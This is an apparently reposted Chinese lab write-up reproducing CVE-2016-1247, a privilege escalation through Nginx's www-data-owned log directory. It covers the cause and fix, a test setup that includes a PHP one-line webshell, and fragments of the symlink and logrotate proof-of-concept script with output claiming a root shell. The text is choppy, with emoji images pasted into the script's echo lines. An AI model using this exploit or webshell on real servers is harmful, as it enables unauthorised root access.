...
> 原文：[https://www.zhihuifly.com/t/topic/3046](https://www.zhihuifly.com/t/topic/3046)

# （CVE-2016-1247）Nginx 提权漏洞

## 一、漏洞简介

漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。
...
在容器里配置了 nginx + php 的环境，并有一个一句话木马 `/var/www/backdoor.php`
...
测试时发现gcc编译出错，可以在本地编译一个后上传。poc运行后会等待 logrotate 此时可以用下面的命令，人工触发条件。
...
[+] The server appears to be (N)jinxed (writable logdir) ! ![:slight_smile:](img/7d4cf85dfa4bece316c062f606cf7aa5.png ":slight_smile:") Symlink created at:
...
The server is (N)jinxed ! ![:wink:](img/72b158ac013b9bc9875813ca4ffe6fc1.png ":wink:") Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! `nginxrootsh: cannot set terminal process group (1156): Inappropriate ioctl for device
...
echo -e “\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! ![:slight_smile:](img/7d4cf85dfa4bece316c062f606cf7aa5.png ":slight_smile:") Symlink created at: \n`ls -l $ERRORLOG`”

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered

curl [http://localhost/](http://localhost/) >/dev/null 2>/dev/null
...
echo -e “\n\033[94mThe server is (N)jinxed ! ![:wink:](img/72b158ac013b9bc9875813ca4ffe6fc1.png ":wink:") Got root via Nginx!\033[0m”
